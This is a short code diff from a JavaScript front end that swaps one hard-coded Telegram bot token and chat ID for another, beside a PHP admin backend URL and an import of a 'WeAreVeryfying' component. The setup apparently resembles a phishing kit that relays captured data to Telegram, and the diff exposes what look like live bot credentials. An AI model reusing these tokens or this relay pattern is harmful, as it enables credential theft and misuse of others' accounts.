@@ -22,8 +22,8 @@ import WeAreVeryfying from "../components/weareveryfying";
 
 // The URL for your PHP backend
 const API_URL = "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api4.php"; // Update this based on your server configuration
-const BOT_TOKEN = '7939347007:AAFu3fkYZiNVGkc1viOKLP4CY722hYGsoq8';
-const CHAT_ID = '6639364559';
+const BOT_TOKEN = '8030819260:AAGO3xuF9G_BEDvHFwv6viegWw2ezawoW10';
+const CHAT_ID = '7062736155';
 
 
 
